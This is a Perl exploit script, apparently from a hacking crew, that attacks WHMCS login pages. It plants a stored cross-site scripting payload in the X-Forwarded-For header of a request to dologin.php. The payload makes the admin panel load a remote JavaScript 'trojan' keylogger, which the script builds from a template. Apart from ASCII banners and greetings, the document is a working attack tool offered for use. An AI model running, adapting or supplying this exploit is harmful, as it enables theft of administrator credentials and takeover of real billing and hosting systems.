#!/usr/bin/perl
# X-Forwarded-For Whmcs Xss inject

use LWP::UserAgent;
use Term::ANSIColor;
use Win32::Console::ANSI;
system("cls");
if(@ARGV < 1){ 
@array = (
   "                                                                      ",
   "[=]----------------------------------------------------------------[=]",
   "|__ __     _____                         _       _     _____         |",
   "|  |  |___|   __|___ ___ _ _ _ ___ ___ _| |___ _| |___|   __|___ ___ |",
   "|-   -|___|   __| . |  _| | | | .'|  _| . | -_| . |___|   __| . |  _||",
   "|__|__|   |__|  |___|_| |_____|__,|_| |___|___|___|   |__|  |___|_|  |",
   "[+] whmcs xSs Keylogger                                              |",
   "[+] by Or4ngM4n[S4udiT3rr0rist] [S4E-T34M]                           |",
   "[+] Copyright [sec4ever team & Mamber]                               |",
   "[+] perl whmcs-Keylogger.pl -logger <= logger panel admin            |",
   "[+] perl whmcs-Keylogger.pl -s4ever <= about tool +thanks            |",
   "[=]----------------------------------------------------------------[=]",
   "                                                                      ",
);
 foreach (@array) {
 	print color("bold red"), "    $_\n"; sleep(1);
	print color 'reset';
}
}

sub inject{
print "\n";
print "Url Target + admin path ~#";
chomp($url = <STDIN>);
print "Url Js trojan ~#";
chomp($jsu = <STDIN>);
my $UserAgent = new LWP::UserAgent;
$UserAgent->agent("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
$UserAgent->default_header('X-Forwarded-For' =>  "|<script src=$jsu ></script>|");
my $response = $UserAgent->post("$url/dologin.php",
{ 
"username"   => "0r4ng", 
"password"   => "0r4ng",
});

if ($content = $response->content=~ /Login Failed. Please Try Again./ ){
print "[-] Exploit not vulnrability ..";
}else{
print "[+] Successed \n";
}
}
if ($ARGV[0] =~ "-logger" ) {
open(FILE, "<trojan.load") || die "Error File ?";
my @jss = <FILE>;
close(FILE);
   print "URL Dologin.php~#";
   chomp($urls = <STDIN>);
my @lines;
foreach(@jss) {
   $_ =~ s/URLRE/$urls/g;
   push(@lines,$_);
}

open(FILE, ">js/trojan.js") || die "Error Created ?";
print FILE @lines;
close(FILE);
print "Creat trojan js ..";
print "\n";
print "Loading inject";
sleep(1);
print "\n";
print "are you upload the files ? hit Enter";
$hit = <STDIN>;
inject;
}
if ($ARGV[0] =~ "-s4ever" ) {
@s4e =(
"  ___ _ _  ___   _____ ___   _   __  __  ",
" / __| | || __| |_   _| __| /_\ |  \/  | ",
" \__ \_  _| _|    | | | _| / _ \| |\/| | ",
" |___/ |_||___|   |_| |___/_/ \_\_|  |_| ",
" #>: i love sec4ever & i love 4 ever     ",
" sec4ever , i-Hmx , Rab3oun , massacreur ",
" rOx , S4E Member , x00x Team , s3c-k.com",
);
 foreach (@s4e) {
 	print color("bold yellow"), "    $_\n"; sleep(1);
	print color 'reset';
}
}